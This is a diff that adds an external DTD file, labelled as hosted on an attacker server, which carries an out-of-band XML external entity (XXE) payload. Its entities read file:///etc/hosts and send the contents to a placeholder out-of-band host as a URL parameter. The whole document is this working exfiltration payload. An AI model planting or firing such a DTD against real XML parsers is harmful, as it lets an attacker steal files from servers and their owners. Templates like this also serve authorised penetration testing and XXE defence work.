@@ -1,0 +1,6 @@
+# DTD hosted on attacker server (evil.dtd)
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://YOUR-OAST/?x=%file;'>">
+%eval;
+%exfil;
+
